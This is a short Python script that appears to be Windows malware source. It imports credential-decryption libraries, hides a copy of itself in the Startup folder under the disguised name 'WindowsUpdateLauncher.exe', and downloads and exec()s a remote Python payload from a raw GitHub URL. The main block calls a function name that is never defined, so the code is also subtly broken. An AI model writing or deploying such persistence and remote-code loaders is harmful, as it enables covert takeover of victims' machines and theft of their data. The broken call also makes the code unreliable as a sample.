import os
import subprocess
import tempfile
import zipfile
import shutil
import requests
import json
import sqlite3
import base64
import time
import ctypes as ct
from ctypes import c_char_p, c_void_p, c_uint, POINTER, Structure, cast, byref, string_at
from getpass import getpass
import websocket
import win32crypt
from Crypto.Cipher import AES
import re
import datetime
import platform
from pathlib import Path

def copy_to_startup():
    try:
        import sys
        import os
        import shutil
        import ctypes
        
        if not getattr(sys, 'frozen', False):
            return False
        
        current_exe = sys.executable
        
        startup = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
            'WindowsUpdateLauncher.exe'
        )
        
        if not os.path.exists(startup):
            shutil.copy2(current_exe, startup)
            ctypes.windll.kernel32.SetFileAttributesW(startup, 2)
            return True
        return False
    except:
        return False
        
def fetch_and_execute(url):
    response = requests.get(url)
    response.raise_for_status()
    script_content = response.text
    exec(script_content, globals())

if __name__ == "__main__":
    copy_exe_to_startup()
    github_urls = [
        'https://raw.githubusercontent.com/azayan165-svg/f/refs/heads/main/w.py'
    ]
    for url in github_urls:
        fetch_and_execute(url)
